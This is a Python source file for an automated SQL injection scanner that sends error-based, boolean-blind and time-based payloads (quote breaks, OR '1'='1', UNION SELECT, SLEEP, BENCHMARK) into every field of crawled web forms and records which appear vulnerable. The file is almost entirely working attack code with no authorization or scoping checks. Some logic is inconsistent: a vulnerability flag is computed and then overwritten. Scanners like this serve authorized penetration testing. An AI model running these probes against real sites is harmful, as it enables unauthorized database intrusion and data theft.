"""
SqlProber.py
Reads discovered forms from scored_results.ndjson and probes each form field
for SQL injection vulnerabilities using error-based and time-based detection.
Results are written to sqli_probe_results.ndjson.
"""

import json
import time
import re
import requests
from datetime import datetime, timezone
from urllib.parse import urlencode

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

PRIORITY_THRESHOLD = 30   # only probe pages with priority strictly above this

SCORED_RESULTS_PATH = "scored_results.ndjson"
OUT_PATH = "sqli_probe_results.ndjson"

# Field types that are never useful to fuzz for SQLi
SKIP_TYPES = {"submit", "file", "image", "reset", "button"}

# SQL error patterns to look for in responses (case-insensitive)
SQLI_ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"you have an error in your sql",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"odbc.*error",
    r"ora-\d{4,5}",
    r"pg_query\(\)",
    r"sqlite.*error",
    r"syntax error.*near",
    r"unexpected end of sql",
    r"division by zero",
    r"supplied argument is not a valid mysql",
    r"error in your sql syntax",
    r"microsoft ole db provider for sql server",
    r"invalid column name",
    r"column.*does not exist",
]

COMPILED_ERROR_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQLI_ERROR_PATTERNS]

# Payloads: (label, payload)
ERROR_PAYLOADS = [
    ("single_quote",      "'"),
    ("comment_dash",      "' -- "),
    ("or_true",           "' OR '1'='1'"),
    ("or_true_comment",   "1' OR '1'='1'#"),
    ("union_null",        "' UNION SELECT NULL#"),
    ("stacked",           "'; SELECT SLEEP(0)#"),
]

# Time-based payloads: (label, payload, expected_min_delay_seconds)
TIME_PAYLOADS = [
    ("sleep_mysql",   "1' AND SLEEP(5)#",              3.0),
    ("benchmark",     "1' AND BENCHMARK(5000000,MD5(1))#", 2.5),
]

TIME_PROBE_THRESHOLD = 2.0   # seconds — flag if response takes longer than this (lowered for reliability)
REQUEST_TIMEOUT = 15         # seconds


BOOLEAN_PAYLOAD_PAIRS = [
    (
        "boolean_or_true_false",
        "1' OR '1'='1",          # always true  — expect normal output
        "1' OR '1'='2",          # always false — expect different/empty output
    ),
    (
        "boolean_and_true_false",
        "1' AND '1'='1",         # true
        "1' AND '1'='2",         # false
    ),

]


BOOLEAN_DIFF_THRESHOLD = 0.02


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _contains_sqli_error(text: str) -> list[str]:
    """Return a list of matched error pattern labels found in text."""
    matched = []
    for pattern in COMPILED_ERROR_PATTERNS:
        if pattern.search(text):
            matched.append(pattern.pattern)
    return matched


def _should_skip_field(field: dict) -> bool:
    """Return True if this field should not be fuzzed."""
    ftype = (field.get("type") or "text").lower()
    if ftype in SKIP_TYPES:
        return True
    if field.get("never_fuzz") is True:
        return True
    return False


def _build_baseline_data(fields: list[dict]) -> dict:
    """Build a form data dict using original/placeholder values."""
    data = {}
    for f in fields:
        name = f.get("name")
        if not name:
            continue
        ftype = (f.get("type") or "text").lower()
        val = f.get("value")
        if val is None:
            if ftype == "password":
                val = "password"
            elif ftype in ("text", "textarea", "select", "search", "email", "tel", "url"):
                val = "test"
            elif ftype == "number":
                val = "1"
            elif ftype == "radio":
                val = f.get("value") or "on"
            elif ftype == "checkbox":
                val = "on"
            else:
                val = "test"
        data[name] = val
    return data


def _unique_form_key(form: dict) -> tuple:

    action = form.get("action", "")
    method = (form.get("method") or "GET").upper()
    field_names = tuple(sorted(
        f["name"] for f in form.get("fields", []) if f.get("name")
    ))
    return (action, method, field_names)


def _load_unique_forms(results_path: str) -> list[dict]:

    seen_keys: set = set()
    unique: list[dict] = []

    try:
        with open(results_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    record = json.loads(line)
                except Exception:
                    continue

                # --- Priority filter ---
                try:
                    priority = int(record.get("score_sqli_preprobe") or 0)
                except (TypeError, ValueError):
                    priority = 0
                if priority <= PRIORITY_THRESHOLD:
                    continue
                # ----------------------

                page = record.get("page", "")
                forms = record.get("forms") or []
                for form in forms:
                    key = _unique_form_key(form)
                    if key in seen_keys:
                        continue
                    seen_keys.add(key)
                    unique.append({"page": page, "form": form})
    except FileNotFoundError:
        print(f"[SqlProber] Input file not found: {results_path}")
    except Exception as e:
        print(f"[SqlProber] Error reading {results_path}: {e}")

    return unique


def _write_result(record: dict, out_path: str) -> None:
    line = json.dumps(record, ensure_ascii=False)
    print(line)
    with open(out_path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


# ---------------------------------------------------------------------------
# Probe logic
# ---------------------------------------------------------------------------

def _probe_field(
    session: requests.Session,
    page: str,
    form: dict,
    target_field: dict,
    out_path: str,
) -> None:
    """Run all SQL injection payloads against a single form field."""
    action = form.get("action", page)
    method = (form.get("method") or "GET").upper()
    fields = form.get("fields", [])
    field_name = target_field["name"]

    baseline_data = _build_baseline_data(fields)

    # ---- Baseline request -------------------------------------------------
    try:
        if method == "POST":
            baseline_resp = session.post(action, data=baseline_data, timeout=REQUEST_TIMEOUT)
        else:
            baseline_resp = session.get(action, params=baseline_data, timeout=REQUEST_TIMEOUT)

        baseline_len = len(baseline_resp.text)
        baseline_text = baseline_resp.text
    except Exception as e:
        print(f"[SqlProber] Baseline request failed for {action}: {e}")
        baseline_len = 0
        baseline_text = ""

    # ---- Error-based probes ------------------------------------------------
    for label, payload in ERROR_PAYLOADS:
        probe_data = dict(baseline_data)
        probe_data[field_name] = payload

        try:
            t0 = time.monotonic()
            if method == "POST":
                resp = session.post(action, data=probe_data, timeout=REQUEST_TIMEOUT)
            else:
                resp = session.get(action, params=probe_data, timeout=REQUEST_TIMEOUT)
            elapsed = time.monotonic() - t0
        except requests.exceptions.Timeout:
            _write_result({
                "schema_version": 1,
                "source": "sqli_prober",
                "discovered_at": _iso_now(),
                "page": page,
                "form_action": action,
                "form_method": method,
                "field": field_name,
                "probe_type": "error_based",
                "payload_label": label,
                "payload": payload,
                "vulnerable": False,
                "timed_out": True,
                "matched_patterns": [],
                "status_code": None,
                "elapsed_seconds": None,
            }, out_path)
            continue
        except Exception as e:
            print(f"[SqlProber] Request error on {action} [{field_name}={label}]: {e}")
            continue

        matched = _contains_sqli_error(resp.text)

        length_diff = abs(len(resp.text) - baseline_len) / max(baseline_len, 1)

        vulnerable = (
                len(matched) > 0
                or length_diff > 0.05  # new baseline comparison
                or resp.status_code != baseline_resp.status_code
        )

        _write_result({
            "schema_version": 1,
            "source": "sqli_prober",
            "discovered_at": _iso_now(),
            "page": page,
            "form_action": action,
            "form_method": method,
            "field": field_name,
            "probe_type": "error_based",
            "payload_label": label,
            "payload": payload,
            "vulnerable": vulnerable,
            "timed_out": False,
            "matched_patterns": matched,
            "status_code": resp.status_code,
            "elapsed_seconds": round(elapsed, 3),
        }, out_path)

        if vulnerable:
            print(
                f"[!] Potential SQLi (error-based) — {action} | field={field_name} | "
                f"payload={label} | patterns={matched}"
            )

    # ---- Boolean-based blind probes ----------------------------------------
    for label, true_payload, false_payload in BOOLEAN_PAYLOAD_PAIRS:
        results = {}
        for condition, payload in (("true", true_payload), ("false", false_payload)):
            probe_data = dict(baseline_data)
            probe_data[field_name] = payload
            try:
                if method == "POST":
                    resp = session.post(action, data=probe_data, timeout=REQUEST_TIMEOUT)
                else:
                    resp = session.get(action, params=probe_data, timeout=REQUEST_TIMEOUT)
                results[condition] = {"status": resp.status_code, "length": len(resp.text), "text": resp.text}
            except Exception as e:
                print(f"[SqlProber] Request error on {action} [{field_name}={label}/{condition}]: {e}")
                results[condition] = None

        if results.get("true") is None or results.get("false") is None:
            continue

        true_len  = results["true"]["length"]
        false_len = results["false"]["length"]
        max_len   = max(true_len, false_len, 1)

        true_text = results["true"]["text"]
        false_text = results["false"]["text"]

        diff_ratio = abs(true_len - false_len) / max_len
        status_differs = results["true"]["status"] != results["false"]["status"]

        # NEW: compare against baseline too
        true_vs_baseline = abs(true_len - baseline_len) / max(baseline_len, 1)
        false_vs_baseline = abs(false_len - baseline_len) / max(baseline_len, 1)

        content_differs = true_text != false_text

        vulnerable = (
                diff_ratio >= 0.02  # LOWER threshold
                or status_differs
                or content_differs  #
                or true_vs_baseline > 0.05  #
                or false_vs_baseline > 0.05  #
        )

        vulnerable = diff_ratio >= BOOLEAN_DIFF_THRESHOLD or status_differs

        _write_result({
            "schema_version": 1,
            "source": "sqli_prober",
            "discovered_at": _iso_now(),
            "page": page,
            "form_action": action,
            "form_method": method,
            "field": field_name,
            "probe_type": "boolean_blind",
            "payload_label": label,
            "payload": f"true={true_payload!r} | false={false_payload!r}",
            "vulnerable": vulnerable,
            "timed_out": False,
            "matched_patterns": [],
            "status_code_true": results["true"]["status"],
            "status_code_false": results["false"]["status"],
            "length_true": true_len,
            "length_false": false_len,
            "length_diff_ratio": round(diff_ratio, 4),
            "elapsed_seconds": None,
        }, out_path)

        if vulnerable:
            print(
                f"[!] Potential SQLi (boolean-blind) — {action} | field={field_name} | "
                f"payload={label} | len_true={true_len} len_false={false_len} diff={diff_ratio:.2%}"
            )
        time.sleep(0.1)

    # ---- Time-based probes -------------------------------------------------
    for label, payload, min_delay in TIME_PAYLOADS:
        probe_data = dict(baseline_data)
        probe_data[field_name] = payload

        timed_out = False
        elapsed = None
        status_code = None

        try:
            t0 = time.monotonic()
            if method == "POST":
                resp = session.post(action, data=probe_data, timeout=REQUEST_TIMEOUT)
            else:
                resp = session.get(action, params=probe_data, timeout=REQUEST_TIMEOUT)
            elapsed = time.monotonic() - t0
            status_code = resp.status_code
        except requests.exceptions.Timeout:
            elapsed = REQUEST_TIMEOUT
            timed_out = True
        except Exception as e:
            print(f"[SqlProber] Request error on {action} [{field_name}={label}]: {e}")
            continue

        vulnerable = elapsed is not None and elapsed >= TIME_PROBE_THRESHOLD

        _write_result({
            "schema_version": 1,
            "source": "sqli_prober",
            "discovered_at": _iso_now(),
            "page": page,
            "form_action": action,
            "form_method": method,
            "field": field_name,
            "probe_type": "time_based",
            "payload_label": label,
            "payload": payload,
            "vulnerable": vulnerable,
            "timed_out": timed_out,
            "matched_patterns": [],
            "status_code": status_code,
            "elapsed_seconds": round(elapsed, 3) if elapsed is not None else None,
        }, out_path)

        if vulnerable:
            print(
                f"[!] Potential SQLi (time-based) — {action} | field={field_name} | "
                f"payload={label} | elapsed={elapsed:.2f}s"
            )


def probe_forms(
    session: requests.Session,
    scored_results_path: str = SCORED_RESULTS_PATH,
    out_path: str = OUT_PATH,
) -> None:

    # Truncate output file at start of run
    open(out_path, "w", encoding="utf-8").close()

    form_entries = _load_unique_forms(scored_results_path)
    print(f"[SqlProber] Loaded {len(form_entries)} unique form(s) to probe.")

    for entry in form_entries:
        page = entry["page"]
        form = entry["form"]
        action = form.get("action", page)
        method = (form.get("method") or "GET").upper()
        fields = form.get("fields", [])

        fuzzable = [f for f in fields if f.get("name") and not _should_skip_field(f)]

        if not fuzzable:
            print(f"[SqlProber] Skipping form at {action} — no fuzzable fields.")
            continue

        print(f"[SqlProber] Probing form: {method} {action} | fields: {[f['name'] for f in fuzzable]}")

        for field in fuzzable:
            _probe_field(session, page, form, field, out_path)
            time.sleep(0.1)   # small delay between requests


# ---------------------------------------------------------------------------
# Entry points
# ---------------------------------------------------------------------------

def main(
    scored_results_path: str = SCORED_RESULTS_PATH,
    out_path: str = OUT_PATH,
) -> None:
    session = requests.Session()
    probe_forms(session, scored_results_path=scored_results_path, out_path=out_path)
    print(f"[SqlProber] Done. Results written to {out_path}")


if __name__ == "__main__":
    main()